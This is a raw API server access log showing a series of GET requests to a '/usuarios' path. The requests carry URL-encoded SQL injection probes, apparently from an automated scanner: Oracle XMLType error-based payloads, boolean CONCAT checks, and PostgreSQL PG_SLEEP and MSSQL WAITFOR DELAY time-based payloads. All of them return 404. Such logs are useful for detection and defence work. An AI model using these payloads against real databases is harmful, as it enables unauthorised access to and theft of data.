api-1  | INFO:     Started server process [1]
api-1  | INFO:     172.18.0.1:38666 - "GET /usuarios%29/%2A%2A/AND/%2A%2A/6495%3D%28SELECT/%2A%2A/UPPER%28XMLType%28CHR%2860%29%7C%7CCHR%2858%29%7C%7CCHR%28113%29%7C%7CCHR%28118%29%7C%7CCHR%28118%29%7C%7CCHR%28118%29%7C%7CCHR%28113%29%7C%7C%28SELECT/%2A%2A/%28CASE/%2A%2A/WHEN/%2A%2A/%286495%3D6495%29/%2A%2A/THEN/%2A%2A/1/%2A%2A/ELSE/%2A%2A/0/%2A%2A/END%29/%2A%2A/FROM/%2A%2A/DUAL%29%7C%7CCHR%28113%29%7C%7CCHR%28122%29%7C%7CCHR%28112%29%7C%7CCHR%28112%29%7C%7CCHR%28113%29%7C%7CCHR%2862%29%29%29/%2A%2A/FROM/%2A%2A/DUAL%29/%2A%2A/AND/%2A%2A/%288046%3D8046 HTTP/1.1" 404 Not Found
api-1  | INFO:     172.18.0.1:38696 - "GET /usuarios/%2A%2A/AND/%2A%2A/6495%3D%28SELECT/%2A%2A/UPPER%28XMLType%28CHR%2860%29%7C%7CCHR%2858%29%7C%7CCHR%28113%29%7C%7CCHR%28118%29%7C%7CCHR%28118%29%7C%7CCHR%28118%29%7C%7CCHR%28113%29%7C%7C%28SELECT/%2A%2A/%28CASE/%2A%2A/WHEN/%2A%2A/%286495%3D6495%29/%2A%2A/THEN/%2A%2A/1/%2A%2A/ELSE/%2A%2A/0/%2A%2A/END%29/%2A%2A/FROM/%2A%2A/DUAL%29%7C%7CCHR%28113%29%7C%7CCHR%28122%29%7C%7CCHR%28112%29%7C%7CCHR%28112%29%7C%7CCHR%28113%29%7C%7CCHR%2862%29%29%29/%2A%2A/FROM/%2A%2A/DUAL%29 HTTP/1.1" 404 Not Found
api-1  | INFO:     172.18.0.1:38680 - "GET /usuarios%27%29/%2A%2A/AND/%2A%2A/6495%3D%28SELECT/%2A%2A/UPPER%28XMLType%28CHR%2860%29%7C%7CCHR%2858%29%7C%7CCHR%28113%29%7C%7CCHR%28118%29%7C%7CCHR%28118%29%7C%7CCHR%28118%29%7C%7CCHR%28113%29%7C%7C%28SELECT/%2A%2A/%28CASE/%2A%2A/WHEN/%2A%2A/%286495%3D6495%29/%2A%2A/THEN/%2A%2A/1/%2A%2A/ELSE/%2A%2A/0/%2A%2A/END%29/%2A%2A/FROM/%2A%2A/DUAL%29%7C%7CCHR%28113%29%7C%7CCHR%28122%29%7C%7CCHR%28112%29%7C%7CCHR%28112%29%7C%7CCHR%28113%29%7C%7CCHR%2862%29%29%29/%2A%2A/FROM/%2A%2A/DUAL%29/%2A%2A/AND/%2A%2A/%28%27gDCq%27%3D%27gDCq HTTP/1.1" 404 Not Found
api-1  | INFO:     172.18.0.1:38698 - "GET /usuarios%27/%2A%2A/AND/%2A%2A/6495%3D%28SELECT/%2A%2A/UPPER%28XMLType%28CHR%2860%29%7C%7CCHR%2858%29%7C%7CCHR%28113%29%7C%7CCHR%28118%29%7C%7CCHR%28118%29%7C%7CCHR%28118%29%7C%7CCHR%28113%29%7C%7C%28SELECT/%2A%2A/%28CASE/%2A%2A/WHEN/%2A%2A/%286495%3D6495%29/%2A%2A/THEN/%2A%2A/1/%2A%2A/ELSE/%2A%2A/0/%2A%2A/END%29/%2A%2A/FROM/%2A%2A/DUAL%29%7C%7CCHR%28113%29%7C%7CCHR%28122%29%7C%7CCHR%28112%29%7C%7CCHR%28112%29%7C%7CCHR%28113%29%7C%7CCHR%2862%29%29%29/%2A%2A/FROM/%2A%2A/DUAL%29/%2A%2A/AND/%2A%2A/%27BTsw%27%3D%27BTsw HTTP/1.1" 404 Not Found
api-1  | INFO:     172.18.0.1:38714 - "GET /usuarios/%2A%2A/AND/%2A%2A/6495%3D%28SELECT/%2A%2A/UPPER%28XMLType%28CHR%2860%29%7C%7CCHR%2858%29%7C%7CCHR%28113%29%7C%7CCHR%28118%29%7C%7CCHR%28118%29%7C%7CCHR%28118%29%7C%7CCHR%28113%29%7C%7C%28SELECT/%2A%2A/%28CASE/%2A%2A/WHEN/%2A%2A/%286495%3D6495%29/%2A%2A/THEN/%2A%2A/1/%2A%2A/ELSE/%2A%2A/0/%2A%2A/END%29/%2A%2A/FROM/%2A%2A/DUAL%29%7C%7CCHR%28113%29%7C%7CCHR%28122%29%7C%7CCHR%28112%29%7C%7CCHR%28112%29%7C%7CCHR%28113%29%7C%7CCHR%2862%29%29%29/%2A%2A/FROM/%2A%2A/DUAL%29--/%2A%2A/oVfY HTTP/1.1" 404 Not Found
api-1  | INFO:     172.18.0.1:38730 - "GET /%28SELECT/%2A%2A/CONCAT%28CONCAT%28%27qvvvq%27%2C%28CASE/%2A%2A/WHEN/%2A%2A/%286868%3D6868%29/%2A%2A/THEN/%2A%2A/%271%27/%2A%2A/ELSE/%2A%2A/%270%27/%2A%2A/END%29%29%2C%27qzppq%27%29%29 HTTP/1.1" 404 Not Found
api-1  | INFO:     172.18.0.1:38744 - "GET /usuarios%29%3BSELECT/%2A%2A/PG_SLEEP%285%29-- HTTP/1.1" 404 Not Found
api-1  | INFO:     172.18.0.1:38758 - "GET /usuarios%3BSELECT/%2A%2A/PG_SLEEP%285%29-- HTTP/1.1" 404 Not Found
api-1  | INFO:     172.18.0.1:38760 - "GET /usuarios%27%29%3BSELECT/%2A%2A/PG_SLEEP%285%29-- HTTP/1.1" 404 Not Found
api-1  | INFO:     172.18.0.1:38766 - "GET /usuarios%27%3BSELECT/%2A%2A/PG_SLEEP%285%29-- HTTP/1.1" 404 Not Found
api-1  | INFO:     172.18.0.1:38780 - "GET /usuarios%29%3BWAITFOR/%2A%2A/DELAY/%2A%2A/%270%3A0%3A5%27-- HTTP/1.1" 404 Not Found
api-1  | INFO:     172.18.0.1:38784 - "GET /usuarios%3BWAITFOR/%2A%2A/DELAY/%2A%2A/%270%3A0%3A5%27-- HTTP/1.1" 404 Not Found
api-1  | INFO:     172.18.0.1:38786 - "GET /usuarios%27%29%3BWAITFOR/%2A%2A/DELAY/%2A%2A/%270%3A0%3A5%27-- HTTP/1.1" 404 Not Found
api-1  | INFO:     172.18.0.1:38798 - "GET /usuarios%27%3BWAITFOR/%2A%2A/DELAY/%2A%2A/%270%3A0%3A5%27-- HTTP/1.1" 404 Not Found
